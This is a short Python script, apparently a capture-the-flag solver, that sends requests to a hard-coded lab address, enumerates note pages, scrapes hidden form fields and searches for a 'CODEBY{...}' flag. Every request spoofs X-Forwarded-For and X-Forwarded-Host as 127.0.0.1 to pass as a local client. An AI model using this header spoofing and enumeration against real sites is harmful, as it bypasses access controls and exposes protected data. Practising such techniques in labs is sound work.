import requests
from lxml import etree
import re
URL = 'http://62.173.140.174:16096'
ERR = 'http://62.173.140.174:16096/note/err'
STYLE = 'http://62.173.140.174:16096/static/css/style.css'
HEADERS = {"X-Forwarded-Host": "127.0.0.1:16096","X-Forwarded-For": "127.0.0.1"}
def get_requests():
    URLs = list()  
    for i in range(27):
       URLs.append(f'{URL}/note/{i + 1}')
    URLs.extend([URL, ERR, STYLE])

    return URLs
       
    

def get_flag():
    def get_hidden(resp):
        hiddenFields = []
        tree = etree.HTML(resp.text)
        hidden_inputs = tree.xpath('//input[@type="hidden"]')
        for hidden in hidden_inputs:
            hiddenFields.append((hidden.get('name'), hidden.get('value')))
        return hiddenFields

    urls = get_requests() 
    match = []
    HiddenFields = []
    for index, url in enumerate(urls):
        
        try:
            resp = requests.get(url=url, headers=HEADERS)
            HiddenFields.append(get_hidden(resp))
        except:           
            return HiddenFields, match
        
        result = re.search(r'CODEBY\{([^}]*)\}', resp.text)
        if result is not None:
            match.append(result.group(1))
        
        if index == 29:
            HiddenFields.append(get_hidden(resp))
            return HiddenFields, match



if __name__ == '__main__':
    hiddenfield, result = get_flag()
    if result:
       print(result)
    else:
        print('флага нет')
    if hiddenfield:
        print(hiddenfield)
    
        
    
        
   




